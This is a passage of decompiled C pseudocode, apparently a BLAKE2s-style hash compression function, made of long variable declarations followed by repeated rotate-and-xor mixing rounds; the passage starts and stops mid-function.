  int v237; // ecx
  unsigned int v238; // ebx
  int v239; // ebp
  int v240; // edx
  int v241; // ebx
  int v242; // ebp
  int v243; // edx
  int v244; // ebx
  int v245; // ebp
  int v246; // esi
  int v247; // ebx
  int v248; // ebp
  int v249; // esi
  int v250; // ebx
  int v251; // ebp
  int v252; // eax
  int v253; // ebx
  int v254; // ebp
  int v255; // eax
  int v256; // ebx
  int v257; // ebp
  int v258; // ecx
  int v259; // ebx
  int v260; // ecx
  int v261; // edx
  int v262; // ebx
  int v263; // edi
  int v264; // edx
  unsigned int v265; // ebx
  int v266; // edi
  int v267; // esi
  int v268; // ebx
  int v269; // ebp
  int v270; // esi
  int v271; // ebx
  int v272; // ebp
  int v273; // eax
  int v274; // edi
  int v275; // eax
  int v276; // edi
  int v277; // ecx
  int v278; // ebx
  int v279; // ebp
  int v280; // ecx
  unsigned int v281; // ebx
  int v282; // ebp
  int v283; // edx
  int v284; // ebx
  int v285; // ebp
  int v286; // edx
  int v287; // ebx
  int v288; // ebp
  int v289; // esi
  int v290; // ebx
  int v291; // ebp
  int v292; // ebx
  int v293; // esi
  int v294; // eax
  int v295; // ebx
  int v296; // ebp
  int v297; // eax
  int v298; // ebx
  int v299; // ebp
  int v300; // ecx
  int v301; // ebx
  int v302; // ebp
  int v303; // ecx
  int v304; // ebx
  int v305; // ebp
  int v306; // edx
  int v307; // edi
  int v308; // edx
  unsigned int v309; // ebx
  int v310; // edi
  int v311; // esi
  int v312; // ebx
  int v313; // ebp
  int v314; // esi
  int v315; // ebx
  int v316; // ebp
  int v317; // eax
  int v318; // edi
  int v319; // eax
  int v320; // edi
  int v321; // ecx
  int v322; // ebx
  int v323; // ebp
  int v324; // ecx
  int v325; // ebp
  int v326; // edx
  int v327; // ebx
  int v328; // ebp
  int v329; // edx
  int v330; // ebx
  int v331; // ebp
  int v332; // esi
  int v333; // ebx
  int v334; // ebp
  int v335; // esi
  int v336; // ebx
  int v337; // ebp
  int v338; // eax
  int v339; // ebx
  int v340; // ebp
  int v341; // eax
  int v342; // ebx
  int v343; // ebp
  int v344; // ecx
  int v345; // ebx
  int v346; // ebp
  int v347; // ecx
  int v348; // ebx
  int v349; // ebp
  int v350; // edx
  int v351; // edi
  int v352; // edx
  int v353; // edi
  int v354; // esi
  int v355; // ebx
  int v356; // ebp
  int v357; // esi
  int v358; // ebx
  int v359; // ebp
  int v360; // eax
  int v361; // edi
  int v362; // eax
  int v363; // edi
  int v364; // ecx
  int v365; // ebx
  int v366; // ebp
  int v367; // ecx
  unsigned int v368; // ebx
  int v369; // ebp
  int v370; // edx
  int v371; // ebx
  int v372; // ebp
  int v373; // edx
  int v374; // ebx
  int v375; // ebp
  int v376; // esi
  int v377; // ebx
  int v378; // ebp
  int v379; // esi
  int v380; // ebx
  int v381; // ebp
  int v382; // eax
  int v383; // ebx
  int v384; // ebp
  int v385; // eax
  int v386; // ebx
  int v387; // ebp
  int v388; // ecx
  int v389; // ecx
  int v390; // ebx
  int v391; // ebp
  int v392; // edx
  int v393; // edi
  int v394; // edx
  int v395; // edi
  int v396; // esi
  int v397; // ebx
  int v398; // ebp
  int v399; // esi
  int v400; // ebx
  int v401; // ebp
  int v402; // ebx
  int v403; // eax
  int v404; // ebx
  int v405; // edi
  int v406; // eax
  int v407; // ebx
  int v408; // edi
  int v409; // ecx
  int v410; // ebx
  int v411; // ebp
  int v412; // ecx
  unsigned int v413; // ebx
  int v414; // ebp
  int v415; // edx
  int v416; // ebx
  int v417; // ebp
  int v418; // edx
  int v419; // ebx
  int v420; // ebp
  int v421; // esi
  int v422; // ebx
  int v423; // ebp
  int v424; // ebx
  int v425; // esi
  int v426; // ebx
  int v427; // ebp
  int v428; // eax
  int v429; // ebx
  int v430; // ebp
  int v431; // ebx
  int v432; // eax
  int v433; // ebp
  int v434; // ecx
  int v435; // ebp
  int v436; // eax
  int v437; // edx
  int v438; // ecx
  int v439; // edi
  int v440; // eax
  unsigned int v441; // edx
  int v442; // edi
  int v443; // esi
  int v444; // edx
  int v445; // eax
  int v446; // esi
  unsigned int i; // eax
  int v448; // ecx
  int v449; // ecx
  int result; // eax
  bool v451; // zf
  int v452; // [esp+Ch] [ebp-94h]
  int v453; // [esp+10h] [ebp-90h]
  int v454; // [esp+14h] [ebp-8Ch]
  int v455; // [esp+18h] [ebp-88h]
  int v456; // [esp+1Ch] [ebp-84h]
  int v457; // [esp+20h] [ebp-80h]
  int v458; // [esp+24h] [ebp-7Ch]
  int v459; // [esp+28h] [ebp-78h]
  int v460; // [esp+2Ch] [ebp-74h]
  int v461; // [esp+30h] [ebp-70h]
  int v462; // [esp+34h] [ebp-6Ch]
  int v463; // [esp+38h] [ebp-68h]
  int v464; // [esp+3Ch] [ebp-64h]
  int v465; // [esp+40h] [ebp-60h]
  unsigned int v466; // [esp+44h] [ebp-5Ch]
  int v467; // [esp+48h] [ebp-58h]
  int v468; // [esp+4Ch] [ebp-54h]
  int v469; // [esp+50h] [ebp-50h] BYREF
  int v470; // [esp+54h] [ebp-4Ch] BYREF
  int v471; // [esp+58h] [ebp-48h]
  int v472; // [esp+5Ch] [ebp-44h]
  int v473; // [esp+60h] [ebp-40h]
  int v474; // [esp+64h] [ebp-3Ch]
  int v475; // [esp+68h] [ebp-38h]
  int v476; // [esp+6Ch] [ebp-34h]
  int v477; // [esp+70h] [ebp-30h]
  int v478; // [esp+74h] [ebp-2Ch]
  int v479; // [esp+78h] [ebp-28h]
  int v480; // [esp+7Ch] [ebp-24h]
  int v481; // [esp+80h] [ebp-20h]
  int v482; // [esp+84h] [ebp-1Ch]
  int v483; // [esp+88h] [ebp-18h]
  int v484; // [esp+8Ch] [ebp-14h]
  int v485; // [esp+90h] [ebp-10h]
  int v486; // [esp+94h] [ebp-Ch]
  unsigned int v487; // [esp+98h] [ebp-8h]
  int v488; // [esp+9Ch] [ebp-4h]

  v3 = a2;
  v486 = a3;
  if ( a3 >= 0x40 )
    v486 = 64;
  v4 = *a1;
  v5 = a1[1];
  v6 = a1[2];
  v7 = a1[3];
  v457 = a1[4];
  v458 = a1[5];
  v8 = a1[7];
  v459 = a1[6];
  v460 = v8;
  while ( 1 )
  {
    v9 = (_DWORD *)(v3 + 8);
    v10 = 0;
    v11 = -v3;
    v488 = (int)&v469 + v11;
    v487 = 0;
    v485 = (int)&v470 + v11;
    do
    {
      *(&v469 + v10) = *(v9 - 2);
      *(&v470 + v10) = *(v9 - 1);
      *(_DWORD *)((char *)v9 + v488) = *v9;
      *(_DWORD *)((char *)v9 + v485) = v9[1];
      v10 = v487 + 4;
      v9 += 4;
      v487 = v10;
    }
    while ( v10 < 0x10 );
    v12 = v486;
    a1[8] += v486;
    v13 = a1[8];
    a1[9] += v13 < v12;
    v466 = a1[9] ^ 0x9B05688C;
    v14 = a1[11] ^ 0x5BE0CD19;
    v467 = a1[10] ^ 0x1F83D9AB;
    v468 = v14;
    v15 = v457 + v469 + v4;
    v465 = __ROR4__(v13 ^ 0x510E527F ^ v15, 16);
    v16 = __ROR4__((v465 + 1779033703) ^ v457, 12);
    v17 = v16 + v470 + v15;
    v18 = __ROR4__(v465 ^ v17, 8);
    v19 = v18 + v465 + 1779033703;
    v465 = v18;
    v457 = __ROR4__(v19 ^ v16, 7);
    v20 = v458 + v471 + v5;
    v466 = __ROR4__(v466 ^ v20, 16);
    v21 = __ROR4__((v466 - 1150833019) ^ v458, 12);
    v22 = v21 + v472 + v20;
    v458 = v21;
    v23 = __ROR4__(v466 ^ v22, 8);
    v24 = v23 + v466 - 1150833019;
    v466 = v23;
    v458 = __ROR4__(v24 ^ v458, 7);
    v462 = v24;
    v25 = v459 + v473 + v6;
    v26 = __ROR4__(v467 ^ v25, 16);
    v27 = __ROR4__((v26 + 1013904242) ^ v459, 12);
    v28 = v27 + v474 + v25;
    v459 = v27;
    v29 = v26 + 1013904242;
    v30 = __ROR4__(v26 ^ v28, 8);
    v31 = v30 + v29;
    v467 = v30;
    v459 = __ROR4__(v31 ^ v459, 7);
    v463 = v31;
    v32 = v460 + v475 + v7;
    v468 = __ROR4__(v468 ^ v32, 16);
    v33 = __ROR4__((v468 - 1521486534) ^ v460, 12);
    v34 = v33 + v476 + v32;
    v35 = __ROR4__(v468 ^ v34, 8);
    v460 = __ROR4__((v35 + v468 - 1521486534) ^ v33, 7);
    v464 = v35 + v468 - 1521486534;
    v36 = v458 + v477 + v17;
    v37 = __ROR4__(v35 ^ v36, 16);
    v38 = v37 + v463;
    v458 = __ROR4__((v37 + v463) ^ v458, 12);
    v39 = v458 + v478 + v36;
    v40 = __ROR4__(v37 ^ v39, 8);
    v41 = v40 + v38;
    v468 = v40;
    v458 = __ROR4__(v41 ^ v458, 7);
    v463 = v41;
    v42 = v459 + v479 + v22;
    v465 = __ROR4__(v465 ^ v42, 16);
    v459 = __ROR4__((v465 + v464) ^ v459, 12);
    v43 = v459 + v480 + v42;
    v44 = __ROR4__(v465 ^ v43, 8);
    v45 = v44 + v465 + v464;
    v465 = v44;
    v459 = __ROR4__(v45 ^ v459, 7);
    v464 = v45;
    v46 = v460 + v481 + v28;
    v466 = __ROR4__(v466 ^ v46, 16);
    v47 = v466 + v19;
    v460 = __ROR4__(v47 ^ v460, 12);
    v48 = v460 + v482 + v46;
    v466 = __ROR4__(v466 ^ v48, 8);
    v49 = v466 + v47;
    v460 = __ROR4__(v49 ^ v460, 7);
    v50 = v457 + v483 + v34;
    v51 = __ROR4__(v467 ^ v50, 16);
    v52 = v51 + v462;
    v457 = __ROR4__((v51 + v462) ^ v457, 12);
    v53 = v457 + v484 + v50;
    v54 = __ROR4__(v51 ^ v53, 8);
    v55 = v54 + v52;
    v467 = v54;
    v457 = __ROR4__(v55 ^ v457, 7);
    v56 = v457 + v483 + v39;
    v465 = __ROR4__(v465 ^ v56, 16);
    v57 = v465 + v49;
    v457 = __ROR4__(v57 ^ v457, 12);
    v58 = v457 + v479 + v56;
    v465 = __ROR4__(v465 ^ v58, 8);
    v59 = v465 + v57;
    v457 = __ROR4__(v59 ^ v457, 7);
    v60 = v458 + v473 + v43;
    v61 = __ROR4__(v466 ^ v60, 16);
    v62 = v61 + v55;
    v458 = __ROR4__(v62 ^ v458, 12);
    v63 = v458 + v477 + v60;
    v64 = __ROR4__(v61 ^ v63, 8);
    v65 = v64 + v62;
    v466 = v64;
    v458 = __ROR4__(v65 ^ v458, 7);
    v462 = v65;
    v66 = v459 + v478 + v48;
    v67 = __ROR4__(v467 ^ v66, 16);
    v68 = v67 + v463;
    v459 = __ROR4__((v67 + v463) ^ v459, 12);
    v69 = v459 + v484 + v66;
    v70 = __ROR4__(v67 ^ v69, 8);
    v71 = v70 + v68;
    v467 = v70;
    v459 = __ROR4__(v71 ^ v459, 7);
    v463 = v71;
    v72 = v460 + v482 + v53;
    v73 = __ROR4__(v468 ^ v72, 16);
    v74 = v73 + v464;
    v460 = __ROR4__((v73 + v464) ^ v460, 12);
    v75 = v460 + v475 + v72;
    v76 = __ROR4__(v73 ^ v75, 8);
    v77 = v76 + v74;
    v460 = __ROR4__(v77 ^ v460, 7);
    v464 = v77;
    v78 = v458 + v470 + v58;
    v79 = __ROR4__(v76 ^ v78, 16);
    v80 = v79 + v463;
    v458 = __ROR4__((v79 + v463) ^ v458, 12);
    v81 = v458 + v481 + v78;
    v82 = __ROR4__(v79 ^ v81, 8);
    v83 = v82 + v80;
    v468 = v82;
    v458 = __ROR4__(v83 ^ v458, 7);
    v463 = v83;
    v84 = v459 + v469 + v63;
    v85 = __ROR4__(v465 ^ v84, 16);
    v459 = __ROR4__((v85 + v464) ^ v459, 12);
    v86 = v459 + v471 + v84;
    v465 = __ROR4__(v85 ^ v86, 8);
    v464 += v465 + v85;
    v459 = __ROR4__(v464 ^ v459, 7);
    v87 = v460 + v480 + v69;
    v88 = __ROR4__(v466 ^ v87, 16);
    v89 = v88 + v59;
    v460 = __ROR4__(v89 ^ v460, 12);
    v90 = v460 + v476 + v87;
    v91 = __ROR4__(v88 ^ v90, 8);
    v92 = v91 + v89;
    v466 = v91;
    v460 = __ROR4__(v92 ^ v460, 7);
    v93 = v457 + v474 + v75;
    v94 = __ROR4__(v467 ^ v93, 16);
    v95 = v94 + v462;
    v457 = __ROR4__((v94 + v462) ^ v457, 12);
    v96 = v457 + v472 + v93;
    v97 = __ROR4__(v94 ^ v96, 8);
    v98 = v97 + v95;
    v467 = v97;
    v457 = __ROR4__(v98 ^ v457, 7);
    v99 = v457 + v480 + v81;
    v465 = __ROR4__(v465 ^ v99, 16);
    v100 = v465 + v92;
    v457 = __ROR4__(v100 ^ v457, 12);
    v101 = v457 + v477 + v99;
    v465 = __ROR4__(v465 ^ v101, 8);
    v102 = v465 + v100;
    v457 = __ROR4__(v102 ^ v457, 7);
    v103 = v458 + v481 + v86;
    v104 = __ROR4__(v466 ^ v103, 16);
    v105 = v104 + v98;
    v458 = __ROR4__(v105 ^ v458, 12);
    v106 = v458 + v469 + v103;
    v107 = __ROR4__(v104 ^ v106, 8);
    v108 = v107 + v105;
    v466 = v107;
    v458 = __ROR4__(v108 ^ v458, 7);
    v462 = v108;
    v109 = v459 + v474 + v90;
    v110 = __ROR4__(v467 ^ v109, 16);
    v111 = v110 + v463;
    v459 = __ROR4__((v110 + v463) ^ v459, 12);
    v112 = v459 + v471 + v109;
    v113 = __ROR4__(v110 ^ v112, 8);
    v114 = v113 + v111;
    v467 = v113;
    v459 = __ROR4__(v114 ^ v459, 7);
    v463 = v114;
    v115 = v460 + v484 + v96;
    v116 = __ROR4__(v468 ^ v115, 16);
    v117 = v116 + v464;
    v468 = v116;
    v118 = __ROR4__((v116 + v464) ^ v460, 12);
    v119 = v118 + v482 + v115;
    v468 = __ROR4__(v468 ^ v119, 8);
    v464 = v468 + v117;
    v460 = __ROR4__((v468 + v117) ^ v118, 7);
    v120 = v458 + v479 + v101;
    v121 = __ROR4__(v468 ^ v120, 16);
    v122 = v121 + v463;
    v458 = __ROR4__((v121 + v463) ^ v458, 12);
    v123 = v458 + v483 + v120;
    v124 = __ROR4__(v121 ^ v123, 8);
    v125 = v124 + v122;
    v468 = v124;
    v458 = __ROR4__(v125 ^ v458, 7);
    v463 = v125;
    v126 = v459 + v472 + v106;
    v127 = __ROR4__(v465 ^ v126, 16);
    v128 = v127 + v464;
    v459 = __ROR4__((v127 + v464) ^ v459, 12);
    v129 = v459 + v475 + v126;
    v130 = __ROR4__(v127 ^ v129, 8);
    v131 = v130 + v128;
    v465 = v130;
    v459 = __ROR4__(v131 ^ v459, 7);
    v464 = v131;
    v132 = v460 + v476 + v112;
    v466 = __ROR4__(v466 ^ v132, 16);
    v133 = v466 + v102;
    v460 = __ROR4__(v133 ^ v460, 12);
    v134 = v460 + v470 + v132;
    v466 = __ROR4__(v466 ^ v134, 8);
    v135 = v466 + v133;
    v460 = __ROR4__(v135 ^ v460, 7);
    v136 = v457 + v478 + v119;
    v137 = __ROR4__(v467 ^ v136, 16);
    v138 = v137 + v462;
    v457 = __ROR4__((v137 + v462) ^ v457, 12);
    v139 = v457 + v473 + v136;
    v140 = __ROR4__(v137 ^ v139, 8);
    v141 = v140 + v138;
    v467 = v140;
    v457 = __ROR4__(v141 ^ v457, 7);
    v142 = v457 + v476 + v123;
    v465 = __ROR4__(v465 ^ v142, 16);
    v143 = v465 + v135;
    v457 = __ROR4__(v143 ^ v457, 12);
    v144 = v457 + v478 + v142;
    v465 = __ROR4__(v465 ^ v144, 8);
    v145 = v465 + v143;
    v457 = __ROR4__(v145 ^ v457, 7);
    v146 = v458 + v472 + v129;
    v147 = __ROR4__(v466 ^ v146, 16);
    v148 = v147 + v141;
    v466 = v147;
    v149 = __ROR4__(v148 ^ v458, 12);
    v150 = v149 + v470 + v146;
    v466 = __ROR4__(v466 ^ v150, 8);
    v151 = v466 + v148;
    v458 = __ROR4__(v151 ^ v149, 7);
    v462 = v151;
    v152 = v459 + v482 + v134;
    v153 = __ROR4__(v467 ^ v152, 16);
    v154 = v153 + v463;
    v459 = __ROR4__((v153 + v463) ^ v459, 12);
    v155 = v459 + v481 + v152;
    v156 = __ROR4__(v153 ^ v155, 8);
    v157 = v156 + v154;
    v467 = v156;
    v459 = __ROR4__(v157 ^ v459, 7);
    v463 = v157;
    v158 = v460 + v480 + v139;
    v159 = __ROR4__(v468 ^ v158, 16);
    v160 = v159 + v464;
    v460 = __ROR4__((v159 + v464) ^ v460, 12);
    v161 = v460 + v483 + v158;
    v162 = __ROR4__(v159 ^ v161, 8);
    v163 = v162 + v160;
    v460 = __ROR4__(v163 ^ v460, 7);
    v464 = v163;
    v164 = v458 + v471 + v144;
    v165 = __ROR4__(v162 ^ v164, 16);
    v166 = v165 + v463;
    v458 = __ROR4__((v165 + v463) ^ v458, 12);
    v167 = v458 + v475 + v164;
    v168 = __ROR4__(v165 ^ v167, 8);
    v169 = v168 + v166;
    v468 = v168;
    v458 = __ROR4__(v169 ^ v458, 7);
    v463 = v169;
    v170 = v459 + v474 + v150;
    v171 = __ROR4__(v465 ^ v170, 16);
    v172 = v171 + v464;
    v459 = __ROR4__((v171 + v464) ^ v459, 12);
    v173 = v459 + v479 + v170;
    v174 = __ROR4__(v171 ^ v173, 8);
    v175 = v174 + v172;
    v465 = v174;
    v459 = __ROR4__(v175 ^ v459, 7);
    v464 = v175;
    v176 = v460 + v473 + v155;
    v466 = __ROR4__(v466 ^ v176, 16);
    v177 = v466 + v145;
    v460 = __ROR4__(v177 ^ v460, 12);
    v178 = v460 + v469 + v176;
    v466 = __ROR4__(v466 ^ v178, 8);
    v179 = v466 + v177;
    v460 = __ROR4__(v179 ^ v460, 7);
    v180 = v457 + v484 + v161;
    v181 = __ROR4__(v467 ^ v180, 16);
    v182 = v181 + v462;
    v457 = __ROR4__((v181 + v462) ^ v457, 12);
    v183 = v457 + v477 + v180;
    v184 = __ROR4__(v181 ^ v183, 8);
    v185 = v184 + v182;
    v467 = v184;
    v457 = __ROR4__(v185 ^ v457, 7);
    v186 = v457 + v478 + v167;
    v465 = __ROR4__(v465 ^ v186, 16);
    v187 = v465 + v179;
    v457 = __ROR4__(v187 ^ v457, 12);
    v188 = v457 + v469 + v186;
    v465 = __ROR4__(v465 ^ v188, 8);
    v189 = v465 + v187;
    v457 = __ROR4__(v189 ^ v457, 7);
    v190 = v458 + v474 + v173;
    v191 = __ROR4__(v466 ^ v190, 16);
    v192 = v191 + v185;
    v458 = __ROR4__(v192 ^ v458, 12);
    v193 = v458 + v476 + v190;
    v194 = __ROR4__(v191 ^ v193, 8);
    v195 = v194 + v192;
    v466 = v194;
    v458 = __ROR4__(v195 ^ v458, 7);
    v462 = v195;
    v196 = v459 + v471 + v178;
    v197 = __ROR4__(v467 ^ v196, 16);
    v198 = v197 + v463;
    v459 = __ROR4__((v197 + v463) ^ v459, 12);
    v199 = v459 + v473 + v196;
    v200 = __ROR4__(v197 ^ v199, 8);
    v201 = v200 + v198;
    v467 = v200;
    v459 = __ROR4__(v201 ^ v459, 7);
    v463 = v201;
    v202 = v460 + v479 + v183;
    v203 = __ROR4__(v468 ^ v202, 16);
    v204 = v203 + v464;
    v460 = __ROR4__((v203 + v464) ^ v460, 12);
    v205 = v460 + v484 + v202;
    v206 = __ROR4__(v203 ^ v205, 8);
    v207 = v206 + v204;
    v460 = __ROR4__(v207 ^ v460, 7);
    v464 = v207;
    v208 = v458 + v483 + v188;
    v209 = __ROR4__(v206 ^ v208, 16);
    v210 = v209 + v463;
    v458 = __ROR4__((v209 + v463) ^ v458, 12);
    v211 = v458 + v470 + v208;
    v212 = __ROR4__(v209 ^ v211, 8);
    v213 = v212 + v210;
    v468 = v212;
    v458 = __ROR4__(v213 ^ v458, 7);
    v463 = v213;
    v214 = v459 + v480 + v193;
    v465 = __ROR4__(v465 ^ v214, 16);
    v459 = __ROR4__((v465 + v464) ^ v459, 12);
    v215 = v459 + v481 + v214;
    v216 = __ROR4__(v465 ^ v215, 8);
    v217 = v216 + v465 + v464;
    v465 = v216;
    v459 = __ROR4__(v217 ^ v459, 7);
    v464 = v217;
    v218 = v460 + v475 + v199;
    v466 = __ROR4__(v466 ^ v218, 16);
    v219 = v466 + v189;
    v460 = __ROR4__(v219 ^ v460, 12);
    v220 = v460 + v477 + v218;
    v466 = __ROR4__(v466 ^ v220, 8);
    v221 = v466 + v219;
    v460 = __ROR4__(v221 ^ v460, 7);
    v222 = v457 + v472 + v205;
    v223 = __ROR4__(v467 ^ v222, 16);
    v224 = v223 + v462;
    v457 = __ROR4__((v223 + v462) ^ v457, 12);
    v225 = v457 + v482 + v222;
    v226 = __ROR4__(v223 ^ v225, 8);
    v227 = v226 + v224;
    v467 = v226;
    v457 = __ROR4__(v227 ^ v457, 7);
    v228 = v457 + v471 + v211;
    v229 = __ROR4__(v465 ^ v228, 16);
    v230 = v229 + v221;
    v457 = __ROR4__(v230 ^ v457, 12);
    v231 = v457 + v481 + v228;
    v232 = __ROR4__(v229 ^ v231, 8);
    v233 = v232 + v230;
    v465 = v232;
    v457 = __ROR4__(v233 ^ v457, 7);
    v234 = v458 + v475 + v215;
    v235 = __ROR4__(v466 ^ v234, 16);
    v236 = v235 + v227;
    v458 = __ROR4__(v236 ^ v458, 12);
    v237 = v458 + v479 + v234;
    v238 = __ROR4__(v235 ^ v237, 8);
    v239 = v238 + v236;
    v466 = v238;
    v458 = __ROR4__(v239 ^ v458, 7);
    v462 = v239;
    v240 = v459 + v469 + v220;
    v241 = __ROR4__(v467 ^ v240, 16);
    v242 = v241 + v463;
    v459 = __ROR4__((v241 + v463) ^ v459, 12);
    v243 = v459 + v480 + v240;
    v244 = __ROR4__(v241 ^ v243, 8);
    v245 = v244 + v242;
    v467 = v244;
    v459 = __ROR4__(v245 ^ v459, 7);
    v463 = v245;
    v246 = v460 + v477 + v225;
    v247 = __ROR4__(v468 ^ v246, 16);
    v248 = v247 + v464;
    v460 = __ROR4__((v247 + v464) ^ v460, 12);
    v249 = v460 + v472 + v246;
    v250 = __ROR4__(v247 ^ v249, 8);
    v251 = v250 + v248;
    v460 = __ROR4__(v251 ^ v460, 7);
    v464 = v251;
    v252 = v458 + v473 + v231;
    v253 = __ROR4__(v250 ^ v252, 16);
    v254 = v253 + v463;
    v458 = __ROR4__((v253 + v463) ^ v458, 12);
    v255 = v458 + v482 + v252;
    v256 = __ROR4__(v253 ^ v255, 8);
    v257 = v256 + v254;
    v468 = v256;
    v458 = __ROR4__(v257 ^ v458, 7);
    v463 = v257;
    v258 = v459 + v476 + v237;
    v259 = __ROR4__(v465 ^ v258, 16);
    v459 = __ROR4__((v259 + v464) ^ v459, 12);
    v260 = v459 + v474 + v258;
    v465 = __ROR4__(v259 ^ v260, 8);
    v464 += v465 + v259;
    v459 = __ROR4__(v464 ^ v459, 7);
    v261 = v460 + v484 + v243;
    v262 = __ROR4__(v466 ^ v261, 16);
    v263 = v262 + v233;
    v460 = __ROR4__(v263 ^ v460, 12);
    v264 = v460 + v483 + v261;
    v265 = __ROR4__(v262 ^ v264, 8);
    v266 = v265 + v263;
    v466 = v265;
    v460 = __ROR4__(v266 ^ v460, 7);
    v267 = v457 + v470 + v249;
    v268 = __ROR4__(v467 ^ v267, 16);
    v269 = v268 + v462;
    v457 = __ROR4__((v268 + v462) ^ v457, 12);
    v270 = v457 + v478 + v267;
    v271 = __ROR4__(v268 ^ v270, 8);
    v272 = v271 + v269;
    v467 = v271;
    v457 = __ROR4__(v272 ^ v457, 7);
    v273 = v457 + v481 + v255;
    v465 = __ROR4__(v465 ^ v273, 16);
    v274 = v465 + v266;
    v457 = __ROR4__(v274 ^ v457, 12);
    v275 = v457 + v474 + v273;
    v465 = __ROR4__(v465 ^ v275, 8);
    v276 = v465 + v274;
    v457 = __ROR4__(v276 ^ v457, 7);
    v277 = v458 + v470 + v260;
    v278 = __ROR4__(v466 ^ v277, 16);
    v279 = v278 + v272;
    v458 = __ROR4__(v279 ^ v458, 12);
    v280 = v458 + v484 + v277;
    v281 = __ROR4__(v278 ^ v280, 8);
    v282 = v281 + v279;
    v466 = v281;
    v458 = __ROR4__(v282 ^ v458, 7);
    v462 = v282;
    v283 = v459 + v483 + v264;
    v284 = __ROR4__(v467 ^ v283, 16);
    v285 = v284 + v463;
    v459 = __ROR4__((v284 + v463) ^ v459, 12);
    v286 = v459 + v482 + v283;
    v287 = __ROR4__(v284 ^ v286, 8);
    v288 = v287 + v285;
    v467 = v287;
    v459 = __ROR4__(v288 ^ v459, 7);
    v463 = v288;
    v289 = v460 + v473 + v270;
    v290 = __ROR4__(v468 ^ v289, 16);
    v291 = v290 + v464;
    v468 = v290;
    v292 = __ROR4__((v290 + v464) ^ v460, 12);
    v293 = v292 + v479 + v289;
    v468 = __ROR4__(v468 ^ v293, 8);
    v464 = v468 + v291;
    v460 = __ROR4__((v468 + v291) ^ v292, 7);
    v294 = v458 + v469 + v275;
    v295 = __ROR4__(v468 ^ v294, 16);
    v296 = v295 + v463;
    v458 = __ROR4__((v295 + v463) ^ v458, 12);
    v297 = v458 + v476 + v294;
    v298 = __ROR4__(v295 ^ v297, 8);
    v299 = v298 + v296;
    v468 = v298;
    v458 = __ROR4__(v299 ^ v458, 7);
    v463 = v299;
    v300 = v459 + v475 + v280;
    v301 = __ROR4__(v465 ^ v300, 16);
    v302 = v301 + v464;
    v459 = __ROR4__((v301 + v464) ^ v459, 12);
    v303 = v459 + v472 + v300;
    v304 = __ROR4__(v301 ^ v303, 8);
    v305 = v304 + v302;
    v465 = v304;
    v459 = __ROR4__(v305 ^ v459, 7);
    v464 = v305;
    v306 = v460 + v478 + v286;
    v466 = __ROR4__(v466 ^ v306, 16);
    v307 = v466 + v276;
    v460 = __ROR4__(v307 ^ v460, 12);
    v308 = v460 + v471 + v306;
    v309 = __ROR4__(v466 ^ v308, 8);
    v310 = v309 + v307;
    v466 = v309;
    v460 = __ROR4__(v310 ^ v460, 7);
    v311 = v457 + v477 + v293;
    v312 = __ROR4__(v467 ^ v311, 16);
    v313 = v312 + v462;
    v457 = __ROR4__((v312 + v462) ^ v457, 12);
    v314 = v457 + v480 + v311;
    v315 = __ROR4__(v312 ^ v314, 8);
    v316 = v315 + v313;
    v467 = v315;
    v457 = __ROR4__(v316 ^ v457, 7);
    v317 = v457 + v482 + v297;
    v465 = __ROR4__(v465 ^ v317, 16);
    v318 = v465 + v310;
    v457 = __ROR4__(v318 ^ v457, 12);
    v319 = v457 + v480 + v317;
    v465 = __ROR4__(v465 ^ v319, 8);
    v320 = v465 + v318;
    v457 = __ROR4__(v320 ^ v457, 7);
    v321 = v458 + v476 + v303;
    v322 = __ROR4__(v466 ^ v321, 16);
    v323 = v322 + v316;
    v458 = __ROR4__(v323 ^ v458, 12);
    v324 = v458 + v483 + v321;
    v466 = __ROR4__(v322 ^ v324, 8);
    v325 = v466 + v323;
    v458 = __ROR4__(v325 ^ v458, 7);
    v462 = v325;
    v326 = v459 + v481 + v308;
    v327 = __ROR4__(v467 ^ v326, 16);
    v328 = v327 + v463;
    v459 = __ROR4__((v327 + v463) ^ v459, 12);
    v329 = v459 + v470 + v326;
    v330 = __ROR4__(v327 ^ v329, 8);
    v331 = v330 + v328;
    v467 = v330;
    v459 = __ROR4__(v331 ^ v459, 7);
    v463 = v331;
    v332 = v460 + v472 + v314;
    v333 = __ROR4__(v468 ^ v332, 16);
    v334 = v333 + v464;
    v460 = __ROR4__((v333 + v464) ^ v460, 12);
    v335 = v460 + v478 + v332;
    v336 = __ROR4__(v333 ^ v335, 8);
    v337 = v336 + v334;
    v460 = __ROR4__(v337 ^ v460, 7);
    v464 = v337;
    v338 = v458 + v474 + v319;
    v339 = __ROR4__(v336 ^ v338, 16);
    v340 = v339 + v463;
    v458 = __ROR4__((v339 + v463) ^ v458, 12);
    v341 = v458 + v469 + v338;
    v342 = __ROR4__(v339 ^ v341, 8);
    v343 = v342 + v340;
    v468 = v342;
    v458 = __ROR4__(v343 ^ v458, 7);
    v463 = v343;
    v344 = v459 + v484 + v324;
    v345 = __ROR4__(v465 ^ v344, 16);
    v346 = v345 + v464;
    v459 = __ROR4__((v345 + v464) ^ v459, 12);
    v347 = v459 + v473 + v344;
    v348 = __ROR4__(v345 ^ v347, 8);
    v349 = v348 + v346;
    v465 = v348;
    v459 = __ROR4__(v349 ^ v459, 7);
    v464 = v349;
    v350 = v460 + v477 + v329;
    v466 = __ROR4__(v466 ^ v350, 16);
    v351 = v466 + v320;
    v460 = __ROR4__(v351 ^ v460, 12);
    v352 = v460 + v475 + v350;
    v466 = __ROR4__(v466 ^ v352, 8);
    v353 = v466 + v351;
    v460 = __ROR4__(v353 ^ v460, 7);
    v354 = v457 + v471 + v335;
    v355 = __ROR4__(v467 ^ v354, 16);
    v356 = v355 + v462;
    v457 = __ROR4__((v355 + v462) ^ v457, 12);
    v357 = v457 + v479 + v354;
    v358 = __ROR4__(v355 ^ v357, 8);
    v359 = v358 + v356;
    v467 = v358;
    v457 = __ROR4__(v359 ^ v457, 7);
    v360 = v457 + v475 + v341;
    v465 = __ROR4__(v465 ^ v360, 16);
    v361 = v465 + v353;
    v457 = __ROR4__(v361 ^ v457, 12);
    v362 = v457 + v484 + v360;
    v465 = __ROR4__(v465 ^ v362, 8);
    v363 = v465 + v361;
    v457 = __ROR4__(v363 ^ v457, 7);
    v364 = v458 + v483 + v347;
    v365 = __ROR4__(v466 ^ v364, 16);
    v366 = v365 + v359;
    v458 = __ROR4__(v366 ^ v458, 12);
    v367 = v458 + v478 + v364;
    v368 = __ROR4__(v365 ^ v367, 8);
    v369 = v368 + v366;
    v466 = v368;
    v458 = __ROR4__(v369 ^ v458, 7);
    v462 = v369;
    v370 = v459 + v480 + v352;
    v371 = __ROR4__(v467 ^ v370, 16);
    v372 = v371 + v463;
